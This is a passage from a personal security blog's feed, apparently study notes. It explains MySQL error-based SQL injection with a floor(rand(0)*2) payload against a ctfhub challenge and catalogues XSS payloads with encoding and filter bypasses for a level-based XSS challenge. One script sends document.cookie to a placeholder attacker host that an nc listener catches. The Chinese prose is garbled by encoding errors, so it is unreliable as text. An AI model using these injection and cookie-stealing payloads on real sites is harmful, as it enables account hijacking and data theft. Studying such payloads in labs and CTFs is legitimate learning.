keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨çš„æ•°æ®ï¼›å¦‚æœkeyä¸åœ¨ä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚</p><p><strong>rand()ï¼š</strong></p><blockquote><p>ç”Ÿæˆ0~1ä¹‹é—´çš„éšæœºæ•°ï¼Œå¯ä»¥ç»™å®šä¸€ä¸ªéšæœºæ•°çš„ç§å­ï¼Œå¯¹äºæ¯ä¸€ä¸ªç»™å®šçš„ç§å­ï¼Œrand()å‡½æ•°éƒ½ä¼šäº§ç”Ÿä¸€ç³»åˆ—å¯ä»¥å¤ç°çš„æ•°å­—</p></blockquote><p><strong>floor()ï¼š</strong></p><blockquote><p>å¯¹ä»»æ„æ­£æˆ–è€…è´Ÿçš„åè¿›åˆ¶å€¼å‘ä¸‹å–æ•´</p></blockquote><p>é€šå¸¸åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ–¹æ³•æ˜¯<code>floor(rand(0))*2</code> ,å…¶ä¼šç”Ÿæˆ0å’Œ1ä¸¤ä¸ªæ•°</p><p><strong>group by</strong></p><blockquote><p>group byæ˜¯æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„çš„sqlè¯­å¥ï¼Œå…¶ç”¨æ³•ä¸ºï¼š<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p></blockquote><p>æŠ¥é”™çš„åŸå› æ˜¯å› ä¸º<strong>rand()å‡½æ•°åœ¨æŸ¥è¯¢çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡,æ’å…¥çš„æ—¶å€™è¿˜ä¼šæ‰§è¡Œä¸€æ¬¡.</strong>è¿™å°±æ˜¯æ•´ä¸ªè¯­å¥æŠ¥é”™çš„å…³é”®</p><p>å‰é¢è¯´è¿‡floor(rand(0)<em>2) å‰å…­ä½æ˜¯<em>*0110110</em></em></p><p><strong>group by xå…ˆå»ºç«‹ä¸€ä¸ªç©ºè¡¨,ç”¨äºåˆ†ç»„.</strong>ç„¶åè¿›è¡Œåˆ†ç»„æŸ¥è¯¢,ç¬¬ä¸€æ¬¡rand()æ‰§è¡Œ,æŸ¥è¯¢çš„ç»“æœæ˜¯0,å› ä¸ºæ˜¯ç©ºè¡¨æ‰€ä»¥æ’å…¥è¿™æ¡,è€Œæ’å…¥çš„æ—¶å€™rand()åˆæ‰§è¡Œäº†ä¸€æ¬¡,æ‰€ä»¥è¡¨ä¸­çš„ç»“æœå°±æ˜¯</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png" alt="img"></a></p><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œ,æ¥ç€æ‰§è¡Œrand()çš„å€¼ä¸º1,å› ä¸ºè¡¨ä¸­å­˜åœ¨,æ‰€ä»¥åŠ 1,è¡¨ä¸­ç»“æœæˆä¸º</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png" alt="img"></a></p><p>åˆ°äº†ç¬¬ä¸‰æ¬¡æ‰§è¡Œrand()æ˜¯å€¼ä¸º0,å› ä¸ºè¡¨ä¸­ä¸å­˜åœ¨æ‰€ä»¥è¦æ’å…¥æ–°çš„æ•°æ®,<strong>è¿™æ¬¡æ’å…¥rand()å†æ¬¡æ‰§è¡Œ,æ‰€ä»¥æ’å…¥çš„åˆæ˜¯1.è€Œè¡¨ä¸­å·²ç»å­˜åœ¨1äº†</strong></p><p><strong>æ­¤æ—¶æ’å…¥å› ä¸ºé‡å¤å‡ºç°åŒä¸€ä¸ªkey,å°±ä¼šå‡ºç°æŠ¥é”™ é‡å¤å‡ºç°key.è€ŒæŠ¥é”™ä¸­ä¼šè¯´æ˜é‚£ä¸ªkeyæœ‰é—®é¢˜,æˆ‘ä»¬çš„keyä¸­ç»“åˆäº†æƒ³è¦äº†è§£çš„å­—ç¬¦ä¸²root@localhost</strong></p><p><strong>è¿™æ ·å°±å®ç°äº†æŠ¥é”™æ³¨å…¥,æ‹¿åˆ°äº†è‡ªå·±æƒ³è¦çš„æ•°æ®</strong></p><p><strong><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png" alt="img"></a></strong></p><p>è¿™å°±æ˜¯æ•´ä¸ªæŠ¥é”™æ³¨å…¥çš„åŸç†äº†,rand(),floor() group by å‡½æ•°ç¼ºä¸€ä¸å¯.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ctfhubæŠ¥é”™æ³¨å…¥</p><h3 id="ctfhubæŠ¥é”™æ³¨å…¥"><a href="#ctfhubæŠ¥é”™æ³¨å…¥" class="headerlink" title="ctfhubæŠ¥é”™æ³¨å…¥"></a>ctfhubæŠ¥é”™æ³¨å…¥</h3><p>æŸ¥è¡¨</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png" alt="image-20200817145102761"></p><p>æŸ¥flag</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png" alt="image-20200817145552296"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æˆ‘å°±å•çº¯æƒ³æŠŠè¿™äº›ä¸œè¥¿å­˜ä¸‹æ¥&lt;/p&gt;
&lt;h1 id=&quot;åŸºç¡€å­¦ä¹ &quot;&gt;&lt;a href=&quot;#åŸºç¡€å­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;åŸºç¡€å­¦ä¹ &quot;&gt;&lt;/a&gt;åŸºç¡€å­¦ä¹ &lt;/h1&gt;&lt;h2 id=&quot;1-SQLæ³¨å…¥çš„åˆ†ç±»&quot;&gt;&lt;a href=&quot;#1-SQLæ³¨å…¥çš„åˆ†ç±»&quot; cl</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="https://pz1o.top/2020/12/09/xss/"/>
    <id>https://pz1o.top/2020/12/09/xss/</id>
    <published>2020-12-09T15:34:13.000Z</published>
    <updated>2020-12-09T15:36:11.388Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ›´ä¹±ï¼Œä¹Ÿå°±é‚£ä¸ªå°æŒ‘æˆ˜è¿˜ç®—å®Œæ•´</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š"><a href="#ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š" class="headerlink" title="ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š"></a>ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š</h3><p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªç½‘é¡µï¼Œhtmlå’Œphpï¼Œphpä¼šå»¶æ—¶æ‰§è¡Œã€‚</p><p>åŒæ­¥ï¼šåªæœ‰å½“phpæ‰§è¡Œå®Œä¹‹åï¼Œæ‰ä¼šæ˜¾ç¤ºhtmlç½‘é¡µã€‚</p><p>å¼‚æ­¥ï¼šåˆ·æ–°ä¹‹åï¼Œä¼šç«‹å³æ˜¾ç¤ºhtmlç½‘é¡µï¼Œä¹‹åå†æ˜¾ç¤ºphpæ‰§è¡Œçš„å†…å®¹ã€‚</p><h3 id="jsè®¾ç½®cookie"><a href="#jsè®¾ç½®cookie" class="headerlink" title="jsè®¾ç½®cookie"></a>jsè®¾ç½®cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure><h2 id="0x01å­˜å‚¨xss"><a href="#0x01å­˜å‚¨xss" class="headerlink" title="0x01å­˜å‚¨xss"></a>0x01å­˜å‚¨xss</h2><p>å­˜å‚¨å‹xssä¸»è¦æ˜¯æ”»å‡»è€…å°†xssä»£ç æ’å…¥åˆ°é¡µé¢ä¸Šï¼Œç„¶åå­˜åœ¨æ•°æ®åº“é‡Œï¼Œå½“è®¿é—®è€…è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œå°±ä¼šå¯¼è‡´xssä»£ç æ‰§è¡Œã€‚</p><p>å‡ºç°åœºæ™¯ï¼šç¼–è¾‘å†…å®¹ï¼ˆxssä»£ç ï¼‰å¯ä»¥ä¿å­˜ï¼Œå¹¶ä¸”å¯ä»¥å†æ¬¡è®¿é—®è¿™ä¸ªå†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02åå°„xss"><a href="#0x02åå°„xss" class="headerlink" title="0x02åå°„xss"></a>0x02åå°„xss</h2><p>æ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼ŒæœåŠ¡å™¨å°†urlä¸­çš„xssä»£ç è¾“å…¥åˆ°é¡µé¢ä¸Šï¼Œæ”»å‡»è€…å°†xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»ã€‚</p><p>å‡ºç°åœºæ™¯ï¼šurlä¸­å¯ä»¥ä¼ é€’å‚æ•°</p><p>é€šå¸¸æ¥è¯´ï¼Œä¼šé—­åˆä¸€äº›æ ‡ç­¾ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚</p><p>å¸¸ç”¨é—­åˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;</span><br><span class="line">&#39;&gt;</span><br><span class="line">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜æ˜¯å…·ä½“æƒ…å†µå…·ä½“å¯¹å¾…</p><h2 id="0x03domå‹xss"><a href="#0x03domå‹xss" class="headerlink" title="0x03domå‹xss"></a>0x03domå‹xss</h2><p>æ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼Œå‰ç«¯é¡µé¢ç›´æ¥ä»urlä¸­è·å–xssä»£ç å¹¶ä¸”è¾“å…¥åˆ°é¡µé¢ï¼Œå¯¼è‡´xssä»£ç çš„æ‰§è¡Œï¼Œæ”»å‡»è€…å°†å¸¦æœ‰xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»</p><p>å…³äºåå°„å‹å’Œdomå‹å·®åˆ«ï¼š</p><p>å‰ç«¯å¤„ç†æ˜¯domï¼Œåç«¯å¤„ç†æ˜¯åå°„</p><h1 id="å¸¸ç”¨ä¿®å¤å‡½æ•°"><a href="#å¸¸ç”¨ä¿®å¤å‡½æ•°" class="headerlink" title="å¸¸ç”¨ä¿®å¤å‡½æ•°"></a>å¸¸ç”¨ä¿®å¤å‡½æ•°</h1><p>strip_tagsï¼šè¿‡æ»¤htmlæ ‡ç­¾</p><p>htmlspecialcharsï¼šå°†htmlæ ‡ç­¾è½¬æ¢ä¸ºå®ä½“</p><h1 id="å¸¸ç”¨çš„payload"><a href="#å¸¸ç”¨çš„payload" class="headerlink" title="å¸¸ç”¨çš„payload"></a>å¸¸ç”¨çš„payload</h1><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"<span class="attr">alert</span>('<span class="attr">xss</span>')")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:aaa"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">éœ€è¦ç”¨ç¼–ç ç»•è¿‡æ—¶ï¼š</span><br><span class="line">Base64ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class="line"></span><br><span class="line">urlencodeï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class="line"></span><br><span class="line">HTMLå®ä½“ç¼–ç  ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>bb<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>')&gt;</span>cc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('xss')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"aaa"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>') <span class="attr">bad</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookieç›—å–ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">ncç›‘å¬ç«¯å£1234</span><br></pre></td></tr></table></figure><h1 id="xssç¼–ç "><a href="#xssç¼–ç " class="headerlink" title="xssç¼–ç "></a>xssç¼–ç </h1><h2 id="jsç¼–ç "><a href="#jsç¼–ç " class="headerlink" title="jsç¼–ç "></a>jsç¼–ç </h2><p>JSæä¾›äº†å››ç§å­—ç¬¦ç¼–ç çš„ç­–ç•¥ï¼Œ</p><ul><li>ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\141</code></li><li>ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\x61</code></li><li>å››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\u0061</code></li><li>å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼Œå¦‚<code>\n</code>å’Œ<code>\r</code></li></ul><h2 id="HTMLå®ä½“ç¼–ç "><a href="#HTMLå®ä½“ç¼–ç " class="headerlink" title="HTMLå®ä½“ç¼–ç "></a>HTMLå®ä½“ç¼–ç </h2><p><strong>å‘½åå®ä½“</strong><br>ä»¥<code>&amp;</code>å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œå¦‚<code>&lt;</code>çš„ç¼–ç ä¸º<code>&amp;1t;</code></p><p><strong>å­—ç¬¦ç¼–ç </strong></p><p>åè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶çš„ASCIIç æˆ–è€…Unicodeå­—ç¬¦ç¼–ç ã€‚æ ·å¼ä¸º<code>&amp;#</code>æ•°å€¼;</p><p>å¦‚<code>&lt;</code>çš„ç¼–ç ä¸º</p><p><code>&lt;</code>(10è¿›åˆ¶)&amp;#60</p><p><code>&lt;</code>(16è¿›åˆ¶)&amp;#x003c</p><p><strong>URLç¼–ç </strong></p><p>è¿™é‡Œä¸ºurlå…¨ç¼–ç ï¼Œä¹Ÿå°±æ˜¯ä¸¤æ¬¡urlç¼–ç </p><p>å¦‚alertçš„urlå…¨ç¼–ç <code>ä¸º%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p><p><strong>String.fromCharCodeç¼–ç </strong></p><p>å¦‚alertçš„ç¼–ç ä¸º<code>String.fromCharCode(97,108,101,114,116)</code></p><h1 id="xssæŒ‘æˆ˜é¢˜"><a href="#xssæŒ‘æˆ˜é¢˜" class="headerlink" title="xssæŒ‘æˆ˜é¢˜"></a>xssæŒ‘æˆ˜é¢˜</h1><p>åšä»»ä½•é¢˜éƒ½å¯ä»¥æµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure><p>åšä¸€ä¸‹xssé¢˜</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="/2020/12/09/xss/image-20200821200652133.png" alt="image-20200821200652133"></p><p>å¯ä»¥å‘ç°teståœ¨h2æ ‡ç­¾å¤„ï¼Œç›´æ¥å†™å°±å¯ä»¥åªéœ€è¦å¼¹çª—ï¼Œå°±å¯ä»¥è¿›å…¥ä¸‹ä¸€å…³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="/2020/12/09/xss/image-20200821201141420.png" alt="image-20200821201141420"></p><p><img src="/2020/12/09/xss/image-20200821201207838.png" alt="image-20200821201207838"></p><p>å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œå€¼ç›´æ¥åœ¨valueå¤„ï¼Œæ‰€ä»¥<strong>åªéœ€è¦é—­åˆæ ‡ç­¾å³å¯</strong></p><p><strong>æœç´¢æ¡†é‡Œç›´æ¥å†™</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>åŒæ—¶è¿˜æœ‰å…¶ä»–æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">éœ€è¦é¼ æ ‡åˆ’è¿‡è¾“å…¥æ¡†</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">éœ€è¦ç‚¹å‡»æœç´¢æ¡†</span><br><span class="line">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>è¿™å…³è¿›è¡Œäº†å®ä½“è½¬ä¹‰ï¼Œ<strong>ä¹Ÿå°±æ˜¯è¿‡æ»¤äº†&lt;&gt;å’Œâ€â€,</strong>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å•å¼•å·å’Œæ³¨é‡Šç¬¦</p><p>å…¶ä¸­è½¬ä¹‰å‡½æ•°<img src="/2020/12/09/xss/image-20200821203827654.png" alt="image-20200821203827654"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯<strong>åŒå¼•å·</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>è¿™ä¸ªå…³å¡è¿‡æ»¤äº†onï¼Œä½†æ²¡æœ‰è¿‡æ»¤å•åŒå¼•å·ï¼Œ<strong>æ‰€ä»¥å¯ä»¥ç”¨ä¼ªåè®®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>script è½¬æ¢æˆ scr_ipt        on è½¬æ¢æˆ o_n        src è½¬æ¢æˆ sr_c        data è½¬æ¢æˆ da_ta        href è½¬æ¢æˆ hr_ef</p><p><strong>ä½†å¯ä»¥å¤§å°å†™ç»•è¿‡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>è¿‡æ»¤äº†scriptï¼Œonï¼Œhref</p><p><strong>æ‰€ä»¥å¯ä»¥åŒå†™ç»•è¿‡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>script,onï¼Œsrcï¼Œdataï¼Œhrefï¼Œå¤§å°å†™å¤±æ•ˆï¼Œâ€è¢«ç¼–ç æ‰€ä»¥valueå¤„å‡ 